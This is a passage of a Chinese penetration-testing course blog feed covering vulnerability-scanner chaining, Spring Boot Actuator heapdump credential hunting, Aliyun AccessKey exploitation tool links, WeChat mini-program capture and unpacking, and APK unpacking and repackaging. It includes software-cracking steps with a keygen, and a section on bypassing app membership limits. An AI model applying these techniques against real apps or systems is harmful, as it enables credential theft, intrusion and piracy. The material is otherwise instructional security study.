href="http://xx/">http://xx/</a> –html-output tomcat.html</p><p>.\xray_windows_amd64.exe webscan –listen 127.0.0.1:7777 –html-output app.html</p><h5 id="URL单点扫描-amp-数据包扫描"><a href="#URL单点扫描-amp-数据包扫描" class="headerlink" title="URL单点扫描&amp;数据包扫描"></a>URL单点扫描&amp;数据包扫描</h5><p>1、相互联动性解决漏扫</p><p>2、相互联动性解决URL未探针</p><p>手工触发URL数据包&amp;扫描器爬虫规则探针</p><h5 id="Burp-amp-Xray联动"><a href="#Burp-amp-Xray联动" class="headerlink" title="Burp&amp;Xray联动"></a>Burp&amp;Xray联动</h5><p>1、Burp设置转发代理</p><p>burp设置转发代理，将数据转发到这个7777端口</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321010925516.png" alt="image-20230321010925516"></p><p>2、Xray设置被动扫描</p><p>xray上监听7777，等待burp发送数据过来</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321011031718.png" alt="image-20230321011031718"></p><h5 id="Awvs-amp-Xray联动"><a href="#Awvs-amp-Xray联动" class="headerlink" title="Awvs&amp;Xray联动"></a>Awvs&amp;Xray联动</h5><p>1、Awvs设置代理扫描</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321103844336.png" alt="image-20230321103844336"></p><p>2、Xray设置被动扫描</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321103859987.png" alt="image-20230321103859987"></p><h5 id="Awvs-amp-Burp-amp-Xray联动"><a href="#Awvs-amp-Burp-amp-Xray联动" class="headerlink" title="Awvs&amp;Burp&amp;Xray联动"></a>Awvs&amp;Burp&amp;Xray联动</h5><p>1、Awvs设置代理扫描</p><p>2、Burp设置转发代理</p><p>3、Xray设置被动扫描</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321104220958.png" alt="image-20230321104220958"></p><h4 id="Vulfocus-框架扫描-特定-amp-核心-Goby-amp-Vulmap-amp-Afrog-amp-Pocassist"><a href="#Vulfocus-框架扫描-特定-amp-核心-Goby-amp-Vulmap-amp-Afrog-amp-Pocassist" class="headerlink" title="#Vulfocus-框架扫描-特定&amp;核心-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist"></a>#Vulfocus-框架扫描-特定&amp;核心-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist</h4><h5 id="案例：配合vulfocus进行某服务或中间件的安全检查评估"><a href="#案例：配合vulfocus进行某服务或中间件的安全检查评估" class="headerlink" title="案例：配合vulfocus进行某服务或中间件的安全检查评估"></a>案例：配合vulfocus进行某服务或中间件的安全检查评估</h5><p>对靶场进行cve测试</p><h6 id="Goby-1"><a href="#Goby-1" class="headerlink" title="Goby"></a>Goby</h6><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110040403.png" alt="image-20230321110040403"></p><p>配置：</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110119151.png" alt="image-20230321110119151"></p><p>比如AWVS</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110604816.png" alt="image-20230321110604816"></p><p>扫描出来可以调用工具</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110523677.png" alt="image-20230321110523677"></p><p>选择AWVS后有添加成功提示</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110710731.png" alt="image-20230321110710731"></p><p>在AWVS界面刷新一下，将自动添加了一个目标</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110747098.png" alt="image-20230321110747098"></p><p>还可以配合fofa，点击导入当前页，开始扫描</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321111202157.png" alt="image-20230321111202157"></p><h6 id="Vulmap-1"><a href="#Vulmap-1" class="headerlink" title="Vulmap"></a>Vulmap</h6><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321105504400.png" alt="image-20230321105504400"></p><h6 id="Afrog"><a href="#Afrog" class="headerlink" title="Afrog"></a>Afrog</h6><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321105558550.png" alt="image-20230321105558550"></p><p>右边可以查看扫描报告</p><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321110935252.png" alt="image-20230321110935252"></p><h6 id="Pocassist（可以自己新增POC"><a href="#Pocassist（可以自己新增POC" class="headerlink" title="Pocassist（可以自己新增POC)"></a>Pocassist（可以自己新增POC)</h6><p><img src="/../images/Day72-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap/image-20230321105707376.png" alt="image-20230321105707376"></p><h4 id="某资产特征-联动扫描-综合-amp-调用-Goby-amp-Awvs-amp-Xray-amp-Vulmap"><a href="#某资产特征-联动扫描-综合-amp-调用-Goby-amp-Awvs-amp-Xray-amp-Vulmap" class="headerlink" title="#某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap"></a>#某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap</h4><h5 id="案例：配合Goby-amp-Fofa插件进行某中间件的安全检查评估"><a href="#案例：配合Goby-amp-Fofa插件进行某中间件的安全检查评估" class="headerlink" title="案例：配合Goby&amp;Fofa插件进行某中间件的安全检查评估"></a>案例：配合Goby&amp;Fofa插件进行某中间件的安全检查评估</h5><p>1、下载拓展插件</p><p>2、设置配置插件</p><p>3、扫描调用插件</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞发现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day71 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用</title>
      <link href="/2023/03/15/Day71-APP%E6%94%BB%E9%98%B2-%E5%AE%9E%E6%88%98%E6%8B%BF%E4%B8%8B-Springboot%E6%9C%AA%E6%8E%88%E6%9D%83-HeapDump%E6%8F%90%E5%8F%96-OSS%E5%88%A9%E7%94%A8/"/>
      <url>/2023/03/15/Day71-APP%E6%94%BB%E9%98%B2-%E5%AE%9E%E6%88%98%E6%8B%BF%E4%B8%8B-Springboot%E6%9C%AA%E6%8E%88%E6%9D%83-HeapDump%E6%8F%90%E5%8F%96-OSS%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、APK信息资源提取</p><p>2、微信小程序-数据抓包</p><p>3、微信小程序-解包反编译</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、信息收集-应用&amp;资产提取&amp;权限等</p><p>2、漏洞发现-反编译&amp;脱壳&amp;代码审计</p><p>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p><h3 id="核心点："><a href="#核心点：" class="headerlink" title="#核心点："></a>#核心点：</h3><p>1、内在点-资产提取&amp;版本&amp;信息等</p><p>2、抓包点-反代理&amp;反证书&amp;协议等</p><p>3、逆向点-反编译&amp;脱壳&amp;重打包等</p><p>4、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p><h3 id="安全点："><a href="#安全点：" class="headerlink" title="#安全点："></a>#安全点：</h3><h4 id="1、渗透角度："><a href="#1、渗透角度：" class="headerlink" title="1、渗透角度："></a>1、渗透角度：</h4><p>测试的app提供服务的服务器，网站，接口等，一旦这个有安全问题，被不法分子利用，相当于APP正常服务就会受到直接的影响！</p><p>APK-白盒-Java代码审计</p><p>APK-黑盒-资产&amp;WEB&amp;IP&amp;接口等</p><p>小程序-白盒-Node.JS代码审计</p><p>小程序-黑盒-资产&amp;WEB&amp;IP&amp;接口等</p><h4 id="2、开发角度："><a href="#2、开发角度：" class="headerlink" title="2、开发角度："></a>2、开发角度：</h4><p>测试的app里代码的设计安全，采用没加密的发送数据，采用权限过高的设置导致攻击者利用app获取到手机的敏感信息等。</p><p>弱加密，逻辑安全，授权，中间人等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 对着操作讲解-吃瓜就完事了</p><blockquote><h5 id="1、APP信息收集："><a href="#1、APP信息收集：" class="headerlink" title="1、APP信息收集："></a>1、APP信息收集：</h5><p>1、外在抓包-APP里面涉及的资产</p><p>2、反编译提取-APP里面涉及的资产</p><h5 id="2、资产-信息收集（到了web层面）"><a href="#2、资产-信息收集（到了web层面）" class="headerlink" title="2、资产-信息收集（到了web层面）"></a>2、资产-信息收集（到了web层面）</h5><p>web应用  、cms 、中间件、框架(插件查看)、 服务器IP 、端口等 </p><p>插件检查到杂项中有：webpack  用packerfuzz脚本打包分析</p><p>web漏洞扫描 awvs进行简单探针</p><p><img src="/../images/Day71-APP%E6%94%BB%E9%98%B2-%E5%AE%9E%E6%88%98%E6%8B%BF%E4%B8%8B-Springboot%E6%9C%AA%E6%8E%88%E6%9D%83-HeapDump%E6%8F%90%E5%8F%96-OSS%E5%88%A9%E7%94%A8/image-20230319173304658.png" alt="image-20230319173304658"></p></blockquote><h4 id="安全测试报告："><a href="#安全测试报告：" class="headerlink" title="安全测试报告："></a>安全测试报告：</h4><p>1、Spring Boot Actuator v2 未授权访问</p><p>2、Spring Boot RCE</p><p>3、HeapDump-信息泄漏-帐号密码等</p><p>select s from java.lang.String s </p><p>​    where &#x2F;pass&#x2F;.test(s.value.toString())</p><h4 id="HeapDump文件分析工具："><a href="#HeapDump文件分析工具：" class="headerlink" title="-HeapDump文件分析工具："></a>-HeapDump文件分析工具：</h4><p>分析工具：JVisualVM 、MAT 、heapdump_tool等 用来调试代码的，这里用于查找敏感信息</p><p>JVisualVM：jdk自带，适合新手</p><p>MAT：<a href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a></p><p>heapdump_tool：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p><h4 id="Actuator未授权检测文档："><a href="#Actuator未授权检测文档：" class="headerlink" title="-Actuator未授权检测文档："></a>-Actuator未授权检测文档：</h4><p><a href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a></p><h4 id="SpringBoot漏洞利用文档："><a href="#SpringBoot漏洞利用文档：" class="headerlink" title="-SpringBoot漏洞利用文档："></a>-SpringBoot漏洞利用文档：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p><h4 id="OSS-AccessKey利用工具："><a href="#OSS-AccessKey利用工具：" class="headerlink" title="-OSS_AccessKey利用工具："></a>-OSS_AccessKey利用工具：</h4><p><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p><blockquote><p>备忘！！软件的requirements.txt可能是作者打包这个软件的时候才用到的，自己不要下啊！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> APP攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day70 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取</title>
      <link href="/2023/03/15/Day70-APP%E6%94%BB%E9%98%B2-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E8%A7%A3%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8C%85-APK%E4%BF%A1%E6%81%AF%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/"/>
      <url>/2023/03/15/Day70-APP%E6%94%BB%E9%98%B2-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E8%A7%A3%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8C%85-APK%E4%BF%A1%E6%81%AF%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day70-APP%E6%94%BB%E9%98%B2-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E8%A7%A3%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8C%85-APK%E4%BF%A1%E6%81%AF%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/YVrjr3FOrxMXG4hUE9eb7A.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、APK信息资源提取</p><p>2、微信小程序-数据抓包</p><p>3、微信小程序-解包反编译</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、信息收集-应用&amp;资产提取&amp;权限等</p><p>2、漏洞发现-反编译&amp;脱壳&amp;代码审计</p><p>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p><h3 id="核心点："><a href="#核心点：" class="headerlink" title="#核心点："></a>#核心点：</h3><p>1、内在点-资产提取&amp;版本&amp;信息等</p><p>2、抓包点-反代理&amp;反证书&amp;协议等</p><p>3、逆向点-反编译&amp;脱壳&amp;重打包等</p><p>4、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p><h3 id="安全点："><a href="#安全点：" class="headerlink" title="#安全点："></a>#安全点：</h3><p>1、渗透角度：测试的app提供服务的服务器，网站，接口等，一旦这个有安全问题，被不法分子利用，相当于APP正常服务就会受到直接的影响！</p><p>APK-白盒-Java代码审计</p><p>APK-黑盒-资产&amp;WEB&amp;IP&amp;接口等</p><p>小程序-白盒-Node.JS代码审计</p><p>小程序-黑盒-资产&amp;WEB&amp;IP&amp;接口等</p><p>2、开发角度：测试的app里代码的设计安全，采用没加密的发送数据，采用权限过高的设置导致攻击者利用app获取到手机的敏感信息等。</p><p>弱加密，逻辑安全，授权，中间人等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ APP&amp;APK-信息资源文件提取</p><p>➢ 微信小程序-真机&amp;模拟器数据抓包</p><p>➢ 微信小程序-PC&amp;模拟器分包反编译</p><h4 id="APP-amp-APK-信息资源文件提取"><a href="#APP-amp-APK-信息资源文件提取" class="headerlink" title="#APP&amp;APK-信息资源文件提取"></a>#APP&amp;APK-信息资源文件提取</h4><p>APK Messenger-基本信息&amp;资源文件&amp;开启权限等</p><h4 id="微信小程序-真机-amp-模拟器数据抓包"><a href="#微信小程序-真机-amp-模拟器数据抓包" class="headerlink" title="#微信小程序-真机&amp;模拟器数据抓包"></a>#微信小程序-真机&amp;模拟器数据抓包</h4><p>安卓系统抓包（微信小程序）：</p><p>1、安卓系统7.0以下版本，不管微信任意版本，都会信任系统提供的证书</p><p>2、安卓系统7.0以上版本，微信7.0以下版本，微信会信任系统提供的证书</p><p>3、安卓系统7.0以上版本，微信7.0以上版本，微信只信任它自己配置的证书列表</p><p>基于上述我们解决的方式如下：</p><h6 id="1、将证书安装到系统证书中（需要root）"><a href="#1、将证书安装到系统证书中（需要root）" class="headerlink" title="1、将证书安装到系统证书中（需要root）"></a>1、将证书安装到系统证书中（需要root）</h6><h6 id="2、苹果手机（苹果手机不受此影响）"><a href="#2、苹果手机（苹果手机不受此影响）" class="headerlink" title="2、苹果手机（苹果手机不受此影响）"></a>2、苹果手机（苹果手机不受此影响）</h6><h6 id="3、采用安卓系统低于7-0的模拟器"><a href="#3、采用安卓系统低于7-0的模拟器" class="headerlink" title="3、采用安卓系统低于7.0的模拟器"></a>3、采用安卓系统低于7.0的模拟器</h6><h6 id="4、使用低版本电脑版微信小程序抓包"><a href="#4、使用低版本电脑版微信小程序抓包" class="headerlink" title="4、使用低版本电脑版微信小程序抓包"></a>4、使用低版本电脑版微信小程序抓包</h6><p>演示：逍遥模拟器5.1安卓系统微信小程序抓包</p><p>演示：夜神模拟器多开5安卓系统微信小程序抓包</p><p>演示：真机IPhone-IOS系统微信小程序抓包</p><p>条件：抓包本机需要和Iphone手机处于同一WIFI下</p><p>Iphone配置wifi的代理，代理设置地址写本地抓包的工具地址和端口</p><h4 id="微信小程序-PC-amp-模拟器分包反编译"><a href="#微信小程序-PC-amp-模拟器分包反编译" class="headerlink" title="#微信小程序-PC&amp;模拟器分包反编译"></a>#微信小程序-PC&amp;模拟器分包反编译</h4><h5 id="1、高富帅版："><a href="#1、高富帅版：" class="headerlink" title="1、高富帅版："></a>1、高富帅版：</h5><p>欢迎使用多功能小程序助手工具，点击确定开始使用。</p><p>免责声明：不得将小程序反编译源码程序和反编译图片素材挪作商业或盈利用</p><p>使用教程地：<a href="https://www.kancloud.cn/ludeqi/xcxzs/2607637">https://www.kancloud.cn/ludeqi/xcxzs/2607637</a></p><p>最新版下载地址：<a href="https://xcx.siqingw.top/xcx.zip">https://xcx.siqingw.top/xcx.zip</a></p><h5 id="2、穷屌丝版："><a href="#2、穷屌丝版：" class="headerlink" title="2、穷屌丝版："></a>2、穷屌丝版：</h5><p><a href="https://github.com/sanriqing/WxAppUnpacker">https://github.com/sanriqing/WxAppUnpacker</a></p><h6 id="安装node-js"><a href="#安装node-js" class="headerlink" title="-安装node.js"></a>-安装node.js</h6><p><a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><h6 id="安装依赖："><a href="#安装依赖：" class="headerlink" title="-安装依赖："></a>-安装依赖：</h6><p>npm install</p><h6 id="部分wxapkg还需要解密"><a href="#部分wxapkg还需要解密" class="headerlink" title="-部分wxapkg还需要解密"></a>-部分wxapkg还需要解密</h6><h6 id="模拟器取出wxapkg文件："><a href="#模拟器取出wxapkg文件：" class="headerlink" title="-模拟器取出wxapkg文件："></a>-模拟器取出wxapkg文件：</h6><p>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;xxxxxx&#x2F;appbrand&#x2F;pkg</p><h6 id="反编译解包"><a href="#反编译解包" class="headerlink" title="-反编译解包"></a>-反编译解包</h6><p>node wuWxapkg.js -s&#x3D;..&#x2F; xxxx.wxapkg</p>]]></content>
      
      
      <categories>
          
          <category> APP攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day69 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制</title>
      <link href="/2023/03/15/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/"/>
      <url>/2023/03/15/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/P6fHNVV92xh59pMxUIYaJw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、资产提取-AppinfoScanner </p><p>2、评估框架-MobSF&amp;mobexler</p><p>3、抓包利器-Frida&amp;r0capture</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、信息收集-应用&amp;资产提取&amp;权限等</p><p>2、漏洞发现-反编译&amp;脱壳&amp;代码审计</p><p>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p><h3 id="核心点："><a href="#核心点：" class="headerlink" title="#核心点："></a>#核心点：</h3><p>1、内在点-资产提取&amp;版本&amp;信息等</p><p>2、抓包点-反代理&amp;反证书&amp;协议等</p><p>3、逆向点-反编译&amp;脱壳&amp;重打包等</p><p>4、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p> ➢ 反编译加固-自动查壳脱壳</p><p>➢ 功能修改-反编译&amp;次数&amp;会员</p><p>➢ 功能修改-反编译&amp;图标&amp;信息</p><p>➢ 打包编译-证书签名&amp;重打包等</p><blockquote><p>安卓修改大师破解操作：</p><p>1、下载并安装原程序，先不要运行软件；</p><p>2、接着把crack文件夹里的“ApkHelper.exe”拷贝到软件安装目录下替换；</p><p>【默认路径C:\Program Files (x86)\ApkEditor】</p><p>3、再用crack文件夹里的注册机进行注册；</p><p>4、至此就全部破解完成啦，用户可随意使用里面的功能了 </p></blockquote><h4 id="反编译加固-自动查壳脱壳"><a href="#反编译加固-自动查壳脱壳" class="headerlink" title="#反编译加固-自动查壳脱壳"></a>#反编译加固-自动查壳脱壳</h4><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317131209218.png" alt="image-20230317131209218"></p><p><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a></p><h5 id="查壳：ApkScan-PKID"><a href="#查壳：ApkScan-PKID" class="headerlink" title="查壳：ApkScan-PKID"></a>查壳：ApkScan-PKID</h5><p>加壳</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317131409950.png" alt="image-20230317131409950"></p><p>未加壳</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317131443535.png" alt="image-20230317131443535"></p><h5 id="脱壳：BlackDex"><a href="#脱壳：BlackDex" class="headerlink" title="脱壳：BlackDex"></a>脱壳：BlackDex</h5><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317131711055.png" alt="image-20230317131711055"></p><p>随便选一个脱壳</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317132117243.png" alt="image-20230317132117243"></p><p>将dex文件重新打包为apk：<a href="https://www.52pojie.cn/thread-1106387-1-1.html">脱壳再打包某梆梆免费加固APP - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><blockquote><ol><li><p>创建一个空白文件夹，并将你要反编译的 APK 文件和所有 DEX 文件复制到该文件夹中。</p></li><li><p>打开终端或命令提示符窗口，导航到包含 APK 文件和 DEX 文件的目录中。</p></li><li><p>运行以下命令来反编译 APK 文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apktool d your_app.apk</span><br></pre></td></tr></table></figure><p>请用实际的 APK 文件名替换 “your_app.apk”。</p></li><li><p>进入反编译后生成的目录，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd your_app</span><br></pre></td></tr></table></figure></li><li><p>将所有的 DEX 文件转成smail文件放入your_app</p></li><li><p>重新编译 APK 文件，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apktool b your_app</span><br></pre></td></tr></table></figure></li><li><p>签名 APK 文件，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jarsigner -verbose -keystore my-release-key.keystore your_app/dist/your_app.apk alias_name</span><br></pre></td></tr></table></figure><p>这将使用密钥库文件 “my-release-key.keystore” 对 APK 文件进行重新签名，并使用别名 “alias_name” 进行验证。</p></li><li><p>优化 APK 文件，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zipalign -v 4 your_app/dist/your_app.apk your_app/dist/your_app_aligned.apk</span><br></pre></td></tr></table></figure></li></ol></blockquote><p>Apktool:<a href="https://www.jianshu.com/p/919a966843c4">Apktool 下载、安装和使用 - 简书 (jianshu.com)</a></p><p><a href="https://www.52pojie.cn/thread-1574994-1-1.html">用MT脱壳步骤及使用辅助工具(大佬勿进) - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h4 id="功能修改-反编译-amp-次数-amp-会员"><a href="#功能修改-反编译-amp-次数-amp-会员" class="headerlink" title="#功能修改-反编译&amp;次数&amp;会员"></a>#功能修改-反编译&amp;次数&amp;会员</h4><h5 id="对于观看次数："><a href="#对于观看次数：" class="headerlink" 